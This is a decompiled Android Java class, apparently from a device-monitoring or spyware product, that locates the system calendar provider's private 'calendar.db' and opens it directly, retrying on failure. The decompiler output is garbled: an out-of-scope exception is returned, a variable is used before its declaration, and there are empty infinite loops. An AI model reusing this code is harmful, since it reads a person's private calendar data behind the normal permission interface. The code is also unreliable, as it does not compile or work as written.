package com.vvt.e;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;

public class a
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  private static String c = null;
  
  private static SQLiteDatabase a(int paramInt)
  {
    String str = c;
    if (str == null)
    {
      str = a();
      c = str;
    }
    SQLiteDatabase localSQLiteDatabase = b(paramInt);
    int i = 5;
    for (;;)
    {
      if ((localSQLiteDatabase == null) && (i > 0))
      {
        boolean bool = a;
        if (bool) {}
        long l = 1000L;
        try
        {
          Thread.sleep(l);
          localSQLiteDatabase = b(paramInt);
          i += -1;
        }
        catch (InterruptedException localInterruptedException)
        {
          for (;;) {}
        }
      }
    }
    return localInterruptedException;
  }
  
  public static String a()
  {
    String str1 = c;
    if (str1 == null)
    {
      str1 = com.vvt.n.a.a("com.android.providers.calendar");
      if (str1 != null)
      {
        String str2 = "%s/%s";
        int i = 2;
        Object[] arrayOfObject = new Object[i];
        arrayOfObject[0] = str1;
        bool = true;
        String str3 = "calendar.db";
        arrayOfObject[bool] = str3;
        str1 = String.format(str2, arrayOfObject);
        c = str1;
      }
      boolean bool = a;
      if (!bool) {}
    }
    return c;
  }
  
  public static SQLiteDatabase b()
  {
    return a(17);
  }
  
  private static SQLiteDatabase b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      String str = c;
      localSQLiteDatabase = SQLiteDatabase.openDatabase(str, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;)
      {
        boolean bool = b;
        if (!bool) {}
      }
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/e/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */